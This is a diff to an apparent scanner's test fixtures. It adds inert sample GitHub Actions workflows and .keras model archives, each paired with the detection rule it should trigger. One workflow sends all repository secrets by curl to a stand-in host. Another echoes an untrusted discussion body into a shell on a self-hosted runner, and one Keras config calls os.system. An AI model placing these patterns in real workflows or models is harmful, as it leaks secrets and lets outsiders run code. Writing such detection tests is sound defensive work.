@@ -142,6 +142,59 @@ def _docx_xml(extra: bytes) -> bytes:
     return _zip("word/document.xml", document)
 
 
+def _workflow(kind: str) -> bytes:
+    """An inert GitHub Actions workflow. Nothing here is run or fetched."""
+    if kind == "dump":
+        return (
+            b"on: push\njobs:\n  process:\n    runs-on: ubuntu-latest\n    steps:\n"
+            b'      - run: curl -d "$CONTENT" https://example.invalid/hook\n'
+            b"        env:\n          CONTENT: ${{ toJSON(secrets) }}\n"
+        )
+    if kind == "dump-input":
+        return (
+            b"on: push\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n"
+            b"      - uses: example/secrets-to-env@v1\n"
+            b"        with:\n          secrets: ${{ toJSON(secrets) }}\n"
+        )
+    runner = b"self-hosted" if kind == "backdoor" else b"ubuntu-latest"
+    return (
+        b"on:\n  discussion:\njobs:\n  process:\n    runs-on: " + runner + b"\n"
+        b"    steps:\n      - run: echo ${{ github.event.discussion.body }}\n"
+    )
+
+
+def _keras(kind: str) -> bytes:
+    """A ``.keras`` archive whose config.json holds one inert layer. It is never loaded."""
+    layer: dict[str, object] = {
+        "module": "keras.layers",
+        "class_name": "Dense",
+        "config": {"name": "dense", "units": 4, "activation": "relu"},
+        "registered_name": None,
+    }
+    if kind == "unsafe":
+        function: object = {
+            "module": "os",
+            "class_name": "function",
+            "config": "system",
+            "registered_name": "system",
+        }
+    else:
+        function = {"class_name": "__lambda__", "config": {"code": "4wEAAAAA", "defaults": None}}
+    if kind in {"unsafe", "lambda"}:
+        layer = {
+            "module": "keras.layers",
+            "class_name": "Lambda",
+            "config": {"name": "lambda", "function": function},
+            "registered_name": None,
+        }
+    config = {"module": "keras", "class_name": "Sequential", "config": {"layers": [layer]}}
+    output = io.BytesIO()
+    with zipfile.ZipFile(output, "w") as archive:
+        archive.writestr("metadata.json", json.dumps({"keras_version": "3.8.0"}))
+        archive.writestr("config.json", json.dumps(config))
+    return output.getvalue()
+
+
 def cases() -> list[tuple[str, bytes, str | None]]:
     plist = (
         b'<?xml version="1.0"?><plist version="1.0"><dict>'
@@ -343,6 +396,13 @@ def cases() -> list[tuple[str, bytes, str | None]]:
             b"<< /S /GoToR /F (other.pdf) /D [0 /Fit] >> >>\nendobj\n%%EOF\n",
             "heuristic_pdf_OpenAction",
         ),
+        ("shai-hulud.yml", _workflow("dump"), "dev_github_workflow_secrets_dump"),
+        ("secrets-to-env.yml", _workflow("dump-input"), None),
+        ("discussion.yaml", _workflow("backdoor"), "dev_github_workflow_runner_backdoor"),
+        ("hosted.yml", _workflow("hosted"), None),
+        ("unsafe.keras", _keras("unsafe"), "heuristic_keras_unsafe_call"),
+        ("lambda.keras", _keras("lambda"), "heuristic_keras_lambda"),
+        ("dense.keras", _keras("dense"), None),
     ]
 
 
